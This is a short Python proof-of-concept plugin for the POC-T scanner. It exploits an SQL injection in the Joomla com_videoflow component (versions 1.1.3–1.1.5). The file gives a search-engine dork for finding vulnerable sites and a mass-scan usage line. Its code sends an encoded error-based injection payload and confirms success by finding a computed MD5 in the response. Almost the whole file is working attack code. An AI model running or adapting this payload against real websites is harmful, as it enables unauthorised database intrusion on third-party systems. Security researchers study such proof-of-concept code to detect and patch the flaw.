#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Joomla com_videoflow SQL injection PoC

Dork
  inurl:index.php?option=com_videoflow
version
  1.1.3 - 1.1.5
Type
  boolean-based blind & error-based
Usage
  python POC-T.py -s joomla-videoflow-sqli -aG "inurl:index.php?option=com_videoflow"

"""

import requests
from plugin.urlparser import iterate_path
from plugin.util import randomMD5


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    for each in iterate_path(url):
        plain, cipher = randomMD5(3)
        payload = "/index.php?option=com_videoflow&task=search&vs=1&searchword=-3920%27%29%20OR%201%20GROUP%20BY%20CONCAT%280x71786a7a71%2C%28MID%28%28IFNULL%28CAST%28md5%28{plain}%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x716b6b7a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23".format(plain=plain)
        if '?' in each:
            continue
        target_url = url.rstrip('/') + payload
        try:
            r = requests.get(target_url, timeout=10)
            if cipher in r.content:
                return each
        except Exception, e:
            pass
    return False
